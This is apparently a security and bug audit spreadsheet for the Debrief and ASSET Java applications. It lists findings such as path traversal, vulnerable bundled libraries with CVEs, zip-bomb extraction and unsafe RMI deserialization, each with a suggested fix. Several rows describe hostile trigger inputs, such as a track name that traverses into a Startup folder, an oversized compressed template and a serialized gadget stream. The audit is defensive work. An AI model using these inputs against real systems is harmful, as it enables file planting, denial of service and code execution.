id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-066,A2,org.mwc.debrief.core,org.mwc.debrief.core.operations,ExportToFlatFile,org.mwc.debrief.core/src/org/mwc/debrief/core/operations/ExportToFlatFile.java,security,path-traversal,Medium,High,candidate,Output filename built from unsanitised primary track name,"The SAM flat-file export writes to filePath + separator + primaryTrack.getName() + '_' + date. The track name comes from the loaded data file (.rep/.dpf) and is not sanitised, so a name containing path separators or '..' writes outside the folder the user chose (path traversal on save), and names with characters illegal on Windows (':' '?' '*') make the export fail with only a log entry after a success-looking wizard.",L208-L215,Load a .rep whose track name is '..\..\Startup\x' (quoted token) and run Export to flat file.,Sanitise the name (replace [^A-Za-z0-9._-]) and verify the resulting File's canonical parent equals the chosen folder before writing.,S,grep-able once you know track names are document-controlled; needed the data-flow to rate it.,-,
CR-067,A2,org.mwc.debrief.legacy,-,MANIFEST.MF,org.mwc.debrief.legacy/META-INF/MANIFEST.MF,supply-chain,outdated-dependency,Medium,High,candidate,"zip4j 1.3.2, pdfbox 2.0.3 and jsoup 1.11.3 bundled with known DoS/Zip-Slip fi...","libs/zip4j-1.3.2.jar predates the Zip Slip path-traversal fix (1.3.3, 2018) and is used to extract user-chosen pptx templates. libs/pdfbox-2.0.3.jar is fed untrusted PDFs by PdfLoader/ImportNarrativeDocument.importFromPdf and lacks fixes for CVE-2018-11797 (page-tree DoS, 2.0.12), CVE-2019-0228 (XXE in XMP, 2.0.15), CVE-2021-27807/27906 and CVE-2021-31811/31812 (infinite loops/OOM, 2.0.23-2.0.24). libs/jsoup-1.11.3.jar lacks the CVE-2021-37714 infinite-loop fix (1.14.2) and parses template XML.",MANIFEST.MF L17 (zip4j); libs/pdfbox-2.0.3.jar; libs/jsoup-1.11.3.jar,Crafted PDF opened via the PDF narrative loader; crafted pptx template.,"Bump pdfbox to 2.0.30+, jsoup to 1.15+, zip4j to 2.11+ (adapt UnpackFunction/PackPresentation to the 2.x API).",M,grep-able,CVE-2018-11797; CVE-2019-0228; CVE-2021-27807; CVE-2021-27906; CVE-2021-31811; CVE-2021-31812; CVE-2021-37714,
CR-068,A2+A3,org.mwc.debrief.legacy,Debrief.ReaderWriter.GeoPDF,AbstractGeoPDFBuilder,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/GeoPDF/AbstractGeoPDFBuilder.java,bug,api-misuse,Medium,Medium,candidate,process.waitFor() called before draining gdal stdout/stderr (pipe deadlock),"createBackgroundFile() and generatePDF() call runtime.exec() then process.waitFor() and only afterwards read stdout and stderr. If gdalwarp/gdal_create writes more than the OS pipe buffer (typically 64 KB on Windows, e.g. verbose warnings for a large or malformed GeoTIFF background) the child blocks on write, waitFor() never returns and the GeoPDF export hangs the UI thread indefinitely. || generatePDF calls runtime.exec(...) then process.waitFor() at L576 and only afterwards opens and drains stdout and stderr (L577-L595). If gdal_create emits more than the pipe buffer (typically 64 KB) of warnings, the child blocks on write and waitFor never returns, hanging the export. In addition any non-empty stdout is treated as an error (L588-L590), so informational output aborts the export.",L434-L441; L574-L581; L574-L600,GeoPDF export with a background raster that makes gdalwarp emit many warnings (or with CPL_DEBUG set).,Use ProcessBuilder.redirectErrorStream(true) and consume the output stream in a loop (or a thread) before/while waiting; add a timeout.,S,Requires knowing the Process pipe-buffer semantics; not a grep pattern.,-,
CR-069,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.Word,ImportRiderNarrativeDocument,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java,bug,null-deref,Medium,High,candidate,handleImportX swallows XWPFDocument open failure then dereferences null doc,"handleImportX() catches IOException from new XWPFDocument(inputStream) (L1123-L1126) and continues to doc.getTables() (L1129) with doc==null, throwing NPE. Non-IOException failures (POIXMLException/NotOfficeXmlFileException for a .docx that is really OLE2 or not a zip) are not caught at all. Either way the user sees a generic 'Problem loading' log entry and no explanation.",L1118-L1140,Rename a .doc (OLE2) or a text file to .docx and open it; or a truncated .docx.,"Return early (with a logged, user-visible message) when doc==null and catch POI runtime exceptions around the constructor; mirror the .doc-in-.docx fallback that handleImport has for the opposite case.",S,grep-able,-,
CR-070,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.Word,ImportRiderNarrativeDocument,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java,bug,resource-leak,Medium,High,candidate,Word documents and fallback FileInputStream never closed,"handleImport() never closes the HWPFDocument (L1086), and on the .docx-in-.doc fallback opens a second FileInputStream is2 (L1091) that is never closed; handleImportX() never closes the XWPFDocument in the rider branch (L1123/L1132-L1134) - only ImportNarrativeDocument.importFromWordX() closes it in the other branch. XWPFDocument holds an open ZipFile on the source, so the imported file stays locked on Windows for the workbench lifetime and handles leak per import.",L1083-L1099; L1120-L1134,Import a rider narrative .docx then try to overwrite or delete it in Explorer while Debrief is running.,Use try-with-resources for the documents and is2; close in finally.,S,grep-able,-,
CR-071,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,logic-error,Medium,Medium,candidate,Slide XML read/written with platform default charset (charset mismatch),"Slide and presentation XML are decoded with new String(bytes) (default charset) and written back with FileWriter (default charset) although the parts are UTF-8. On Windows (cp1252 default in Java 11) template bytes undefined in cp1252 (0x81,0x8D,0x8F,0x90,0x9D) become U+FFFD and any non-ASCII narrative text or track name is emitted as cp1252 bytes inside a UTF-8 declared part, producing a PPTX PowerPoint flags as corrupt/repairable or with mojibake.",L241; L807; L825; L850-L852; ParsePresentation.java L31; FindMap.java L51,"Export on Windows with a narrative entry containing 'é' or '°', or a template whose slide XML contains curly quotes.","Use new String(bytes, StandardCharsets.UTF_8) and Files.newBufferedWriter(path, UTF_8) (or Jsoup's charset-aware output).",S,Needed to connect the read and write sides and the OOXML UTF-8 contract; a lint would flag default-charset use but not the resulting file corruption.,-,
CR-072,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,degenerate-input,Medium,High,candidate,Export with zero recorded tracks throws IndexOutOfBounds out of the export path,"createTimeNarrativeShapes() does trackData.getTracks().get(0) (L542) and the per-track loop does coordinates.get(0) (L395). CoreCoordinateRecorder.exportFile() catches only IOException/ZipException/DebriefException, so a recording session where no track was visible ends in an uncaught RuntimeException from stopStepping() after the user completed the dialog.",L395-L396; L542,"Start PPTX recording with all tracks hidden (or a plot with only shapes), step the time, stop and confirm the export dialog.","Validate trackData (at least one track with at least one point) before unpacking, and report via DebriefException.",S,grep-able,-,
CR-073,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,null-deref,Medium,High,candidate,validateDonorFile/export do not guard against templates missing expected shapes,"validateDonorFile catches DebriefException/IOException/ZipException only, but the checks it runs throw unchecked exceptions first: FindMap.getSlides() NPEs when ppt/slides is absent (listFiles()==null), FindMap.checkForMap() and getMapDimesions() IOOBE/NumberFormatException when the 'map' shape lacks a|off/a|ext, findTimeAnimationObjects() NPEs when no p|spTgt targets the 'time' shape (time_anim_tag_big null at L672), findAnimationTagObjects() NPEs without p|animMotion. retrieveMapProperties() NPEs at L756 when no map shape exists. These escape into the SWT dialog (okPressed) and the preference page.",L664-L674; L648-L654; L729-L732; L751-L758; L776-L840; FindMap.java L292; L254-L257,"A pptx with one slide but no shape named 'map', or without any animation timing, chosen as master template.",Catch RuntimeException in validateDonorFile and return a message; null-check every selectFirst/get(0) result and convert to DebriefException.,S,Needed reading of the parent().parent() chains and the catch list to see which failures escape.,-,
CR-074,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,security,zip-bomb,Medium,High,candidate,extractAll of template has no size or entry-count limit,"The whole archive is inflated to disk with no check on uncompressed size, entry count or compression ratio. A small pptx with a multi-GB zero-filled slide part fills the temp volume and stalls the export/validation. validateDonorFile is invoked synchronously in the UI thread from ExportPPTDialog.okPressed().",L67-L68,"A 100 KB .pptx whose ppt/media/x.bin inflates to tens of GB (deflate ratio ~1000:1), set as master template.","Iterate file headers, sum getUncompressedSize(), refuse archives over a fixed budget (e.g. 200 MB) or with more than a few thousand entries before extracting.",S,grep-able (extractAll without bounds) but impact needed the call-site/UI-thread context.,-,
CR-075,A3,org.mwc.asset.legacy,ASSET.Util.jip.rmi,RMIDiscovery,org.mwc.asset.legacy/src/ASSET/Util/jip/rmi/RMIDiscovery.java,security,unsafe-deserialization,Medium,High,candidate,Unauthenticated ServerSocket deserializes first inbound connection (double re...,"startListener binds a ServerSocket on all interfaces in a configurable port range (L252-L254), accepts one connection from anyone (L269), wraps it in an unfiltered ObjectInputStream, readObject()s a MarshalledObject and then calls mo.get() which deserializes a second attacker-controlled payload (L270-L273). The result is stored as the RMI service reference without checking it implements _serviceInterface. No callers of RMIDiscovery/RMILookup exist in the repository, so this is dead code, but it is shipped in the ASSET bundle. RuntimeExceptions from readObject also escape the thread (only IOException/ClassNotFoundException are caught, L277-L280).",L252-L261; L269-L273; L277-L281,"While lookup() is running, an attacker on the LAN connects to the advertised port and sends a serialized gadget/SerialDOS stream (the multicast request at L302 even tells them the port).","Remove the jip RMI discovery package, or if kept, apply ObjectInputFilter, verify the returned Remote is an instance of _serviceInterface, and bind to loopback or authenticate peers.",S,Grep finds ObjectInputStream but the double-deserialization via MarshalledObject.get and the accept-from-anyone design need reading.,-,
CR-076,A3+A4,org.mwc.cmap.core,-,xstream-1.4.12.jar,org.mwc.cmap.core/libs/xstream-1.4.12.jar,supply-chain,vulnerable-dependency,Medium,High,candidate,"XStream 1.4.12 bundled and exported; many RCE/DoS CVEs, no default type allow...","org.mwc.cmap.core ships and exports com.thoughtworks.xstream 1.4.12 (MANIFEST.MF L8, L52-L67). Versions before 1.4.18 have no default security framework and 1.4.12 is affected by CVE-2020-26217 (RCE), CVE-2020-26258 (SSRF), CVE-2020-26259 (file deletion), CVE-2021-21341..21351 and CVE-2021-29505 (RCE/DoS), CVE-2021-39139..39154 and CVE-2022-41966 (DoS). The only consumer (XYPlotView.restorePreviousPlot) deserializes strings from the workbench memento with fromXML and no allowlist. || xstream-1.4.12 is affected by 33 OSV advisories including remote code execution via crafted XML (CVE-2020-26217, CVE-2021-21344..21351, CVE-2021-29505, CVE-2021-39139..39154, CVE-2022-41966, CVE-2024-47072). XYPlotView.restorePreviousPlot creates new XStream(new DomDriver()) at L1112 with no allowTypes/security framework and calls fromXML on strings taken from the Eclipse view memento (L1119, L1128, L1150-L1174). The memento lives in the workspace .metadata/.plugins/org.eclipse.e4.workbench/workbench.xml, so exploitation requires a poisoned workspace or shared .metadata rather than a data file, which caps severity at Medium.","MANIFEST.MF L8; L52-L67; org.mwc.cmap.core/META-INF/MANIFEST.MF L8; org.mwc.cmap.xyplot/src/org/mwc/cmap/xyplot/views/XYPlotView.java L1112-L1128, L1150-L1174",Any XStream.fromXML on attacker-influenced XML; today that is workbench.xml/memento content in the workspace .metadata folder.,"Upgrade to XStream 1.4.21+ and configure xs.allowTypes/allowTypesByWildcard for the few JFreeChart/Debrief classes needed, or replace the memento serialization with plain strings.",M,"grep-able (jar version), but exploitability assessment required locating the single consumer.",CVE-2020-26217; CVE-2021-29505; CVE-2021-39139; CVE-2022-41966; CVE-2021-39144; CVE-2024-47072,
